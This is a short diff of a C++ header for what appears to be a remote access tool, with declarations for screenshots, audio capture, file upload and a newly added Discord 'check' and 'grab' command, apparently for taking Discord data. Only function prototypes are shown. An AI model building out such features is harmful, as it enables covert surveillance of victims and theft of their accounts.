@@ -14,6 +14,10 @@ enum class AudioCommand {
 	start, stop, list
 };
 
+enum class DiscordCommand {
+	check, grab
+};
+
 // navigation
 int pwd(Controller* ctrl);
 int changeDir(Controller* ctrl, const std::string path);
@@ -28,6 +32,9 @@ int uploadFile(Controller* ctrl, const std::string path, size_t size, const char
 int screenshot(Controller* ctrl);
 
 // audio
-int audioControl(Controller* ctrl, AudioCommand cmd);
+int audioCommand(Controller* ctrl, AudioCommand cmd);
+
+// discord
+int discordCommand(Controller* ctrl, DiscordCommand cmd);
 
 #endif
